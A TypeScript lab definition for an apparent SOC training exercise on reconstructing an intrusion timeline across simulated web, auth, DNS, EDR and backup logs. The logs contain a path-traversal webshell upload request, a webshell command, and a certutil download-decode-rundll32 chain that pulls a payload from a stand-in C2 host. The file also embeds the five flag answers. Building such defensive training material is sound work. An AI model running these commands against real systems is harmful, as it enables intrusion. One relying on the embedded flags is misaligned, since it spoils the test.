import { dir, file } from '../vfs';
import type { LabScenario } from '../types';

function analystBox(files: Record<string, ReturnType<typeof file> | ReturnType<typeof dir>>) {
  return { hostname: 'soc-analyst', user: 'root', root: dir(files) };
}

/** SOC module capstone: one continuous five-flag log-correlation investigation spanning web, auth, DNS,
 *  EDR/process, and backup-system logs — reconstructing a FULL intrusion timeline from five independent
 *  data sources, instead of five isolated single-log-source labs. Same file-review convention already
 *  established by `modern-attack-chains-pack.ts`'s `ai-orchestrated-ransomware-investigation` lab, scaled
 *  up to five correlated sources instead of three. */
export const socCapstoneLabs: LabScenario[] = [
  {
    id: 'soc-capstone-full-intrusion-timeline-reconstruction',
    title: 'Capstone: Reconstructing a Full Intrusion Timeline Across Five Log Sources',
    difficulty: 'Hard',
    category: 'SOC',
    briefing:
      "Ridgeline Insurance's SIEM fired a single, unremarkable alert: a backup job failed overnight. That " +
      "alert is the last stage of an intrusion that started hours earlier and left a trail across five " +
      "independent log sources — none of which, read in isolation, tells the full story. This is the actual " +
      "day-to-day work of SOC Tier 2/3 analysis: not spotting one dramatic signature, but correlating five " +
      "ordinary-looking data sources into one coherent timeline. Work backward from the failed backup job to " +
      "the very first request that started it all.",
    objectives: [
      {
        text: 'Review /var/log/web/access.log and identify the initial exploitation request',
        why: 'Every investigation has to start by establishing ground truth on the earliest anomalous event — this is the actual entry point, hours before anything looked urgent enough to alert on.',
      },
      {
        text: 'Review /var/log/auth/authentication.log and identify the credential reused across multiple hosts',
        why: 'A single harvested credential reappearing on hosts it has no normal business reason to touch is one of the highest-signal indicators in authentication telemetry — far more reliable than trying to catch the initial exploit itself.',
      },
      {
        text: 'Review /var/log/dns/proxy-dns.log and identify the beaconing domain',
        why: 'C2 beacons check in on a fixed interval by design — that regularity is exactly what makes them stand out against the natural randomness of normal DNS traffic, once you know to look for the pattern instead of any single suspicious-looking domain name.',
      },
      {
        text: 'Review /var/log/edr/process-tree.log and identify the living-off-the-land execution chain',
        why: 'Every binary involved here is a completely legitimate, signed Windows utility — the anomaly is entirely in the PARENT-CHILD relationship between them, not in any single process being inherently malicious.',
      },
      {
        text: 'Review /var/log/backup/backup-system.log and confirm the final impact',
        why: "This is the alert that actually fired — but by the time you're reading it, you now have the full five-source picture explaining exactly how the attacker got here, hours earlier.",
      },
    ],
    hints: [
      'cat /var/log/web/access.log',
      'cat /var/log/auth/authentication.log',
      'cat /var/log/dns/proxy-dns.log',
      'cat /var/log/edr/process-tree.log',
      'cat /var/log/backup/backup-system.log',
    ],
    totalFlags: 5,
    attacker: analystBox({
      var: dir({
        log: dir({
          web: dir({
            'access.log': file(
              [
                '--- ridgeline-insurance.example claims-portal access log (partial) ---',
                '2026-06-02 09:58:11  203.0.113.40  GET /                                  200  (normal visitor)',
                '2026-06-02 10:03:44  91.203.5.201  POST /claims-portal/api/v3/upload?type=../../../../var/www/shell.php  200  <-- unpatched file-upload path-traversal, writes a webshell to disk',
                '2026-06-02 10:03:46  91.203.5.201  GET  /claims-portal/shell.php?cmd=whoami                             200  <-- webshell confirmed live 2 seconds later',
                '--- exploitation window: 10:03:44 - 10:03:46 ---',
                'flag{path_traversal_upload_writes_webshell_initial_access}',
                '',
              ].join('\n'),
            ),
          }),
          auth: dir({
            'authentication.log': file(
              [
                '--- ridgeline-insurance.example central authentication log (partial) ---',
                '2026-06-02 10:04:02  svc-claims     LOGIN SUCCESS  10.10.220.1   (normal scheduled service login)',
                '2026-06-02 10:04:15  claims-admin   LOGIN SUCCESS  10.10.220.1   <-- 13s after webshell confirmed: credential harvested from the compromised claims-portal host itself',
                '2026-06-02 10:04:22  claims-admin   LOGIN SUCCESS  10.10.220.6   <-- same credential reused on the internal file server 7s later',
                '2026-06-02 10:04:31  claims-admin   LOGIN SUCCESS  10.10.220.9   <-- and the backup controller 9s after that',
                '2026-06-02 10:15:00  jsmith         LOGIN SUCCESS  10.10.220.20  (normal employee login)',
                '--- one harvested credential reached THREE hosts, including the backup controller, in 29 seconds ---',
                'flag{harvested_credential_reused_across_three_hosts_in_29_seconds}',
                '',
              ].join('\n'),
            ),
          }),
          dns: dir({
            'proxy-dns.log': file(
              [
                '--- ridgeline-insurance.example outbound proxy DNS log (partial) ---',
                '2026-06-02 10:04:50  10.10.220.1  query  updates-cdn-relay.example-c2.net   A   (first seen)',
                '2026-06-02 10:09:50  10.10.220.1  query  updates-cdn-relay.example-c2.net   A   (exactly 300s later)',
                '2026-06-02 10:14:50  10.10.220.1  query  updates-cdn-relay.example-c2.net   A   (exactly 300s later again)',
                '2026-06-02 10:19:50  10.10.220.1  query  updates-cdn-relay.example-c2.net   A   (and again — perfectly regular 300s interval)',
                '--- a domain queried every exactly 300 seconds, indefinitely, is a beacon interval — no normal application behaves this regularly ---',
                'flag{fixed_interval_dns_queries_confirm_active_c2_beacon}',
                '',
              ].join('\n'),
            ),
          }),
          edr: dir({
            'process-tree.log': file(
              [
                '--- ridgeline-insurance.example EDR process-lineage log, host 10.10.220.1 (partial) ---',
                '2026-06-02 10:20:03  w3wp.exe (IIS worker process) spawned cmd.exe   <-- a web server process spawning a shell at all is already abnormal',
                '2026-06-02 10:20:04  cmd.exe spawned certutil.exe -urlcache -split -f http://updates-cdn-relay.example-c2.net/stage2.b64 stage2.b64',
                '2026-06-02 10:20:05  cmd.exe spawned certutil.exe -decode stage2.b64 stage2.dll',
                '2026-06-02 10:20:06  cmd.exe spawned rundll32.exe stage2.dll,Run',
                "--- every binary here (certutil.exe, rundll32.exe) is a legitimate, signed Windows utility --",
                '--- the anomaly is entirely the PARENT process lineage: a web server spawning a shell that downloads, decodes, and executes a payload using only living-off-the-land tools ---',
                'flag{lolbin_chain_certutil_download_decode_rundll32_execute}',
                '',
              ].join('\n'),
            ),
          }),
          backup: dir({
            'backup-system.log': file(
              [
                '--- ridgeline-insurance.example backup controller system log (partial) ---',
                '2026-06-02 10:04:35  claims-admin  session started on backup-ctrl02',
                '2026-06-02 10:04:41  claims-admin  action=DeleteSnapshot target=daily-2026-06-01     result=SUCCESS',
                '2026-06-02 10:04:47  claims-admin  action=DeleteSnapshot target=weekly-2026-05-25    result=SUCCESS  <-- last available restore point destroyed',
                '2026-06-02 10:04:52  claims-admin  action=PurgeReplicationTarget                     result=SUCCESS  <-- offsite replication target purged',
                '2026-06-03 02:00:00  scheduler     nightly backup job                                result=FAILED   <-- THIS is the alert that actually fired — hours after the real damage was already done',
                '--- full timeline, five sources correlated: exploitation 10:03:44 -> credential harvest+reuse 10:04:02-31 -> C2 beacon established 10:04:50 -> payload staged 10:20:03-06 -> backup estate destroyed by 10:04:52 ---',
                'flag{full_five_source_timeline_confirms_backup_destruction_root_cause}',
                '',
              ].join('\n'),
            ),
          }),
        }),
      }),
    }),
    network: [],
  },
];
